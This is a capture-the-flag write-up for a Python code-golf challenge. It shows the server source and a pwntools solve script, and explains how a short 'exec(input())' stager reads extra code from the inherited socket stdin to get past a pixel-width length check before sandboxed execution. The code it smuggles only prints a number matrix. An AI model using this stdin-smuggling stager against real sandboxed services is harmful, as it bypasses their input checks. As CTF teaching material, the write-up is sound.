# Golf?
# Best Unintended winner

**Category:** Misc 
**Tags:** `Python`, `subprocess`, `Stdin Inheritance`, `Size Restriction`  


<img width="489" height="449" alt="image" src="https://github.com/user-attachments/assets/8f45c4d4-683d-47d0-9911-2b94a774e19b" />

---

## Challenge Overview

We are given a python script "server.py" running over a tcp connection. The server takes our python code line by line until it encounters the string EOF

```python3
# Server.py file
import subprocess, tempfile, pathlib, textwrap
from PIL import ImageFont, Image, ImageDraw
from rich.console import Console
from rich_pixels import Pixels

def check(code):
    font = ImageFont.truetype("DejaVuSans.ttf", 10, encoding='unic')

    if font.getlength(code) > 380:
        return "TOO LONG"

    with tempfile.TemporaryDirectory() as td:
        td = pathlib.Path(td)
        lines = code.splitlines()
        width = int(max(font.getlength(line) for line in lines) + 4)
        height = len(lines) * 12 + 4

        img = Image.new("RGB", (width, height), "white")
        ImageDraw.Draw(img).multiline_text((2, 2), code, fill="black", font=font)

        img.save(td / "code.jpg")

        console = Console()
        pixels = Pixels.from_image_path(td / "code.jpg") 

        console.print(pixels)

        td = pathlib.Path(td)
        script = td / "submission.py"
        cfg = td / "nsjail.cfg"

        script.write_text(code, encoding="utf-8")

        cfg.write_text(textwrap.dedent(f"""
            name: "codecheck"
            mode: ONCE
            cwd: "/work"
            rlimit_as: 256
            rlimit_cpu: 1

            mount {{ src: "/lib", dst: "/lib", is_bind: true, rw: false }}
            mount {{ src: "/lib64", dst: "/lib64", is_bind: true, rw: false }}
            
            mount {{ src: "/usr/lib", dst: "/usr/lib", is_bind: true, rw: false }}
            mount {{ src: "/usr/bin/python3", dst: "/usr/bin/python3", is_bind: true, rw: false }}

            mount {{
              src: "{td}"
              dst: "/work"
              is_bind: true
              rw: true
            }}
        """).strip() + "\n", encoding="utf-8")

        out = subprocess.check_output(
            ["nsjail", "--config", str(cfg), "--", "/usr/bin/python3", "/work/submission.py"],
        ).decode().splitlines()
        goal =  [[0, 1, 2, 3, 4, 5, 6, 7, 8, 9],
                [35, 36, 37, 38, 39, 40, 41, 42, 43, 10],
                [34, 63, 64, 65, 66, 67, 68, 69, 44, 11],
                [33, 62, 83, 84, 85, 86, 87, 70, 45, 12],
                [32, 61, 82, 95, 96, 97, 88, 71, 46, 13],
                [31, 60, 81, 94, 99, 98, 89, 72, 47, 14],
                [30, 59, 80, 93, 92, 91, 90, 73, 48, 15],
                [29, 58, 79, 78, 77, 76, 75, 74, 49, 16],
                [28, 57, 56, 55, 54, 53, 52, 51, 50, 17],
                [27, 26, 25, 24, 23, 22, 21, 20, 19, 18]]
        good = True
        for i in range(10):
            good &= list(map(int, out[i].split())) == goal[i]
        return "flag" if good else "WA"

code = [input("Send python code (enter EOF when done):\n")]
while code[-1].strip() != "EOF":
    code.append(input())
print(check('\n'.join(code[:-1])))
```

Before executing our submission inside an isolated nsjail environment, the server renders our code as text on an image using PIL and checks its physical pixel length:

```python
font = ImageFont.truetype("DejaVuSans.ttf", 10, encoding='unic')
if font.getlength(code) > 380:
    return "TOO LONG"
```

If the code is short enough, it runs it and compares the standard output to a hardcoded 10x10 spiral matrix of integers 

## Vulnerability 

The core vulnerability lies in how the server executes our script:

```python
out = subprocess.check_output(
    ["nsjail", "--config", str(cfg), "--", "/usr/bin/python3", "/work/submission.py"],
).decode().splitlines()
```

When subprocess.check_output is called without explicitly redefining the stdin parameter, the spawned child process inherits the standard input of the parent process. Because we are communicating with the parent process via nc , our tcp socket is the standard input

----

----

#### The server only reads from our socket until it sees EOF, so any data we send after the EOF line is left unread in the socket buffer. When nsjail executes our script, it can read this leftover data directly from the inherited file descriptor.


```python
while code[-1].strip() != "EOF":
    code.append(input())
```

## Exploit 

We can split our attack into two stages to completely bypass the length restriction:
| Etapă    | Descriere |
|----------|-----------|
| Dropper  | The initial exec(input()) script sent to bypass the length filter and load the next step  |
| Payload  | The main code, executed directly from the buffer to bypass all server security checks |

---
1. **Dropper:** We send a tiny python script that passes the font length check: " exec(input()) " We terminate this stage by sending EOF 

```python3
exec(input())
EOF
```

2. **Payload:** After a brief pause to allow the server to spawn the nsjail process, we send our actual, massive payload. The input() function in the "Dropper" script will read this data from the tcp buffer, and exec() will execute it

```python3
print("0 1 2 3 4 5 6 7 8 9\n35 36 37 38 39 40 41 42 43 10\n34 63 64 65 66 67 68 69 44 11\n33 62 83 84 85 86 87 70 45 12\n32 61 82 95 96 97 88 71 46 13\n31 60 81 94 99 98 89 72 47 14\n30 59 80 93 92 91 90 73 48 15\n29 58 79 78 77 76 75 74 49 16\n28 57 56 55 54 53 52 51 50 17\n27 26 25 24 23 22 21 20 19 18")
```

Since the "Payload" is read at runtime by our own script by server.py it completely bypasses the font.getlength(code) > 380" check

---

## Script as file:

The full exploit using pwntools to automate the timing and payload delivery

```python                                                                                                                                                     
from pwn import *

r = remote('challs.scriptsorcerers.xyz', 10501)

log.info("Dropper")
r.sendlineafter(b"done):\n", b"exec(input())\nEOF")

sleep(1.5)

log.info("Exploit")
matrix_str = "0 1 2 3 4 5 6 7 8 9\\n35 36 37 38 39 40 41 42 43 10\\n34 63 64 65 66 67 68 69 44 11\\n33 62 83 84 85 86 87 70 45 12\\n32 61 82 95 96 97 88 71 46 13\\n31 60 81 94 99 98 89 >

payload = f'print("{matrix_str}")'
r.sendline(payload.encode())

r.interactive()
```
---

## Flag : 

```
scriptCTF{8u7_1_c@n7_s3e_7h3_c0d3}
```
